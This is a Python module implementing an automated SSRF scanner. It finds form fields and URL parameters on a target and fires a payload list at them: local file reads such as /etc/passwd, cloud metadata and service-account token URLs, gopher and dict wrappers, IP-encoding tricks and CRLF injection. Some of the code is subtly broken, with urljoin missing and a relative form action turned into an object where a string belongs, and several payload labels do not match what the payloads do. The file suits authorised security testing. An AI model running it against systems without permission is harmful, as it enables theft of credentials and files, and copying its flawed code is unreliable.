import re
import logging
import aiohttp
import time
import traceback
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urlencode, parse_qs, parse_qsl
from .base_scanner import BaseScanner

class SSRFScanner(BaseScanner):
    def __init__(self, url, session=None):
        config = {'timeout': 30}  # Default config
        super().__init__(session or aiohttp.ClientSession(), config)
        self.url = url
        self.requests_made = 0
        self.ssrf_payloads = [
            # Basic SSRF payloads
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://0.0.0.0",
            
            # Common internal IP ranges
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://192.168.0.1",
            "http://192.168.1.1",
            
            # Alternative localhost representations
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:22",
            "http://127.1",
            "http://127.0.1",
            
            # DNS rebinding payloads
            "http://spoofed.burpcollaborator.net",
            "http://evil.com",
            
            # Protocol wrappers
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "gopher://127.0.0.1:80/_GET / HTTP/1.0",
            "dict://127.0.0.1:11211/stat",
            
            # URL encoded payloads
            "http://%32%31%36%2e%35%38%2e%32%30%34%2e%32%35%35",
            "http://%32%31%36%2e%35%38%2e%32%30%34%2e%32%35%35:80",
            
            # Double URL encoded payloads
            "http://%2531%2537%2532%252e%2531%2536%252e%2532%2530%2534%252e%2531",
            
            # Cloud metadata endpoints
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://169.254.169.254/metadata/v1/",
            
            # Common internal services
            "http://localhost:8080/actuator",
            "http://localhost:8080/swagger-ui.html",
            "http://localhost:8080/api-docs",
            
            # Advanced SSRF payloads
            "@127.0.0.1",
            "127.0.0.1#",
            "localhost#",
            "127.0.0.1%00",
            "localhost%00",
            
            # Decimal IP representation
            "http://2130706433",  # 127.0.0.1
            "http://3232235521",  # 192.168.0.1
            "http://2852039166",  # 169.254.169.254
            
            # Octal IP representation
            "http://0177.0000.0000.0001",
            "http://0x7f.0x0.0x0.0x1",
            
            # Mixed encoding
            "http://127.0.0.1%0d%0aHost:+localhost",
            "http://127.0.0.1%0d%0aConnection:+close",
            
            # IPv6 payloads
            "http://[::ffff:127.0.0.1]",
            "http://[::ffff:7f00:1]",
            "http://[0:0:0:0:0:ffff:127.0.0.1]"
        ]
        
        # Response patterns that might indicate successful SSRF
        self.success_patterns = [
            # Linux system files
            "root:x:",
            "nobody:x:",
            "/bin/bash",
            
            # Windows system files
            "\\[extensions\\]",
            "\\[fonts\\]",
            "\\[files\\]",
            
            # Cloud metadata
            "ami-id",
            "instance-id",
            "security-credentials",
            
            # Common service responses
            "Redis Version",
            "memcached",
            "MySQL server",
            "PostgreSQL",
            "HTTP/1.1 200",
            "HTTP/1.0 200",
            
            # Error messages that might reveal SSRF
            "Failed to connect to",
            "Connection refused",
            "Network is unreachable",
            "No route to host",
            "timeout"
        ]

    async def scan(self):
        """Required implementation of the abstract scan method"""
        self.log("Starting SSRF scan", "INFO")
        try:
            # Find all input points
            input_points = await self.find_input_points(self.url)
            self.log(f"Found {len(input_points)} potential SSRF points", "INFO")
            
            # Test each input point with each payload
            for input_type, input_point in input_points:
                self.log(f"Testing input point: {input_type} - {input_point}", "INFO")
                for payload in self.ssrf_payloads:
                    self.log(f"Testing SSRF payload: {payload}", "DEBUG")
                    await self.test_input_point(input_type, input_point, payload)
                    
            self.log("SSRF scan completed", "INFO")
            return self.vulnerabilities
            
        except Exception as e:
            self.log(f"Error during SSRF scan: {str(e)}", "ERROR")
            self.log(traceback.format_exc(), "DEBUG")
            return []

    async def find_input_points(self, url):
        """Find potential SSRF points in the application"""
        input_points = []
        try:
            self.log(f"Finding SSRF points for {url}", "INFO")
            async with self.session.get(url, ssl=False, timeout=self.config['timeout']) as response:
                if response.status != 200:
                    self.log(f"Received non-200 status code: {response.status}", "WARNING")
                    return input_points
                
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                
                # Find forms
                forms = soup.find_all('form')
                self.log(f"Found {len(forms)} forms to test", "INFO")
                
                for form in forms:
                    method = form.get('method', 'get').lower()
                    action = form.get('action', '')
                    if not action:
                        action = url
                    elif not action.startswith(('http://', 'https://')):
                        base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
                        action = urlparse(urljoin(base_url, action))
                    
                    # Look for input fields that might accept URLs
                    inputs = form.find_all(['input', 'textarea'])
                    for input_elem in inputs:
                        input_type = input_elem.get('type', 'text')
                        input_name = input_elem.get('name', '')
                        if input_name and input_type in ['text', 'url', 'hidden']:
                            self.log(f"Found potential SSRF point in form: {input_name}", "DEBUG")
                            input_points.append(('form', {
                                'method': method,
                                'action': action,
                                'name': input_name,
                                'type': input_type
                            }))
                
                # Find URL parameters
                parsed_url = urlparse(url)
                if parsed_url.query:
                    params = parse_qs(parsed_url.query)
                    for param in params:
                        self.log(f"Found URL parameter: {param}", "DEBUG")
                        input_points.append(('url_param', param))
                
                self.log(f"Found total {len(input_points)} potential SSRF points", "INFO")
                return input_points
                
        except Exception as e:
            self.log(f"Error finding SSRF points: {str(e)}", "ERROR")
            self.log(traceback.format_exc(), "DEBUG")
        
        return input_points

    async def test_input_point(self, input_type, input_point, payload):
        """Test an input point for SSRF vulnerabilities"""
        try:
            self.log(f"Testing {input_type} with SSRF payload: {payload}", "DEBUG")
            
            if input_type == 'url_param':
                # Test URL parameters
                parsed_url = urlparse(self.url)
                params = dict(parse_qsl(parsed_url.query))
                params[input_point] = payload
                query = urlencode(params)
                test_url = parsed_url._replace(query=query).geturl()
                
                self.log(f"Testing URL parameter at: {test_url}", "DEBUG")
                
                async with self.session.get(test_url, ssl=False, timeout=self.config['timeout']) as response:
                    content = await response.text()
                    
                    # Check for successful SSRF indicators
                    if any(re.search(pattern, content, re.IGNORECASE) for pattern in self.success_patterns):
                        self.log(f"Found SSRF vulnerability in URL parameter: {input_point}", "INFO")
                        steps = [
                            f"1. Navigate to {self.url}",
                            f"2. Modify the URL parameter '{input_point}' to contain: {payload}",
                            "3. Observe the internal service response or error in the response"
                        ]
                        self.add_vulnerability(
                            "Server-Side Request Forgery (SSRF)",
                            f"SSRF vulnerability found in URL parameter '{input_point}'",
                            "High",
                            {"url": test_url, "payload": payload},
                            reproduction_steps=steps
                        )
            
            elif input_type == 'form':
                # Test form inputs
                method = input_point['method']
                action = input_point['action']
                data = {input_point['name']: payload}
                
                self.log(f"Testing form submission: method={method}, action={action}, data={data}", "DEBUG")
                
                if method == 'get':
                    params = urlencode(data)
                    test_url = f"{action}?{params}"
                    async with self.session.get(test_url, ssl=False, timeout=self.config['timeout']) as response:
                        content = await response.text()
                else:
                    async with self.session.post(action, data=data, ssl=False, timeout=self.config['timeout']) as response:
                        content = await response.text()
                
                # Check for successful SSRF indicators
                if any(re.search(pattern, content, re.IGNORECASE) for pattern in self.success_patterns):
                    self.log(f"Found SSRF vulnerability in form input: {input_point['name']}", "INFO")
                    steps = [
                        f"1. Navigate to {self.url}",
                        f"2. Locate the form with action '{action}'",
                        f"3. Enter the following payload in the '{input_point['name']}' field: {payload}",
                        f"4. Submit the form using {method.upper()} method",
                        "5. Observe the internal service response or error in the response"
                    ]
                    self.add_vulnerability(
                        "Server-Side Request Forgery (SSRF)",
                        f"SSRF vulnerability found in form input '{input_point['name']}'",
                        "High",
                        {
                            'form_action': action,
                            'method': method,
                            'input_name': input_point['name'],
                            'payload': payload
                        },
                        reproduction_steps=steps
                    )
                    
        except aiohttp.ClientError as e:
            self.log(f"Network error while testing SSRF point: {str(e)}", "ERROR")
        except Exception as e:
            self.log(f"Error testing SSRF point: {str(e)}", "ERROR")
            self.log(traceback.format_exc(), "DEBUG")
